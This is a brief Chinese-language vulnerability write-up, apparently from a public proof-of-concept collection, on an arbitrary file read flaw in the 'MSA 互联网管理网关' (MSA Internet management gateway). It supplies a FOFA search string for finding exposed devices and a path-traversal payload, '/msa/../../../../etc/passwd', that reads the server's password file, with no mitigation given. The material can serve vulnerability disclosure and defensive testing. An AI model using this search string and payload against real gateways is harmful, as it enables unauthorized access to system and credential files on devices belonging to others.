# MSA 互联网管理网关 msa 任意文件下载漏洞

## 漏洞描述

MSA 互联网管理网关存在任意文件读取漏洞，攻击者通过漏洞可以读取服务器任意文件

## 漏洞影响

```
MSA 互联网管理网关
```

## FOFA

```
"互联网管理网关"
```

## 漏洞复现

登录页面

![img](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202110916716.png)

验证POC

```php
/msa/../../../../etc/passwd
```

![img](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202110916705.png)